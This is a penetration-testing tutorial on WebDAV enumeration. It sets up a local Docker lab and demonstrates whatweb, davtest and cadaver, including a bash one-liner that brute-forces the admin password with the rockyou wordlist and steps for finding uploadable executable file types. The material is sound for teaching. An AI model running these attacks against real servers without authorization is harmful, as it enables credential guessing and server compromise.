*WebDAV* (*Web Distributed Authoring and Versioning*) is an extension of the HTTP protocol that allows users to access and manipulate files on a web server over a secure connection.

When we talk about enumerating a WebDAV server, what we are referring to is the process of gathering information about the resources available on the WebDAV server. Attackers can use WebDAV enumeration tools to search for protected resources on the server, such as configuration files, passwords and other sensitive data. Attackers can use the information gathered during enumeration to plan more sophisticated attacks against the server.

Also, this initial reconnaissance phase involves attempting to identify the *file extensions* allowed on the server. Once the allowed file extensions are detected, attackers can exploit this to upload and execute files containing malicious code. If the malicious files are successfully uploaded and executed on the web server, attackers can gain unauthorized access to the server and compromise the security of the system.

The **Davtest** tool is a command-line tool used to perform penetration testing on WebDAV servers. Davtest can be used to enumerate protected resources on a WebDAV server, as well as to test the security configuration of the server. Davtest can also be used to test server authentication and authorization, and to detect known vulnerabilities.

**Cadaver** is another command line tool used to interact with WebDAV servers. Cadaver allows users to browse server resources, upload and download files, and execute commands on the server. Cadaver can also be used to perform penetration testing on WebDAV servers, such as enumeration of protected resources and exploitation of known vulnerabilities.

To prevent WebDAV enumeration and exploitation, it is important that system administrators implement appropriate security measures on the server. This may include limiting the resources available on the server and using strong authentication and authorization. In addition, it is important that users protect their passwords and avoid using weak or easily guessed passwords.

# Example

For the realization of this example we will need to download and configure the lab as follows:

```bash
docker pull bytemark/webdav

# In WebdDAV you have to authenticate yourself or else you normally cannot interact with it.
docker run --restart always -v /srv/dav:/var/lib/dav -e AUTH_TYPE=Digest -e USERNAME=admin -e PASSWORD=richard --publish 80:80 -d bytemark/webdav
```

We could see that we are actually using *WebDAV* with the **whatweb** tool:

```bash
whatweb http://127.0.0.1

# Response
http://127.0.0.1 [401 Unauthorized] Apache[2.4.37], Country[RESERVED][ZZ], HTTPServer[Unix][Apache/2.4.37 (Unix)], IP[127.0.0.1], Title[401 Unauthorized], WWW-Authenticate[WebDAV][Digest]
```

With the **davtest** tool we can, once *authenticated*, upload a series of files telling you which ones are executable, which ones it interprets, etc...

```bash
davtest -url http://127.0.0.1 -auth admin:richard
```

We could create a one-liner that tells us by *brute force* what the password is with the **davtest** tool by providing a password dictionary:

```bash
cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[+] The valid password is $password"; break; fi; done
```

With the **cadaver** tool we can connect and work with a *WebDAV* server after providing the credentials:

```bash
cadaver http://127.0.0.1

# We can use the "help" command inside cadaver to list all available commands
# To upload a file with 'put' you have to be in the same working directory for it to catch it
```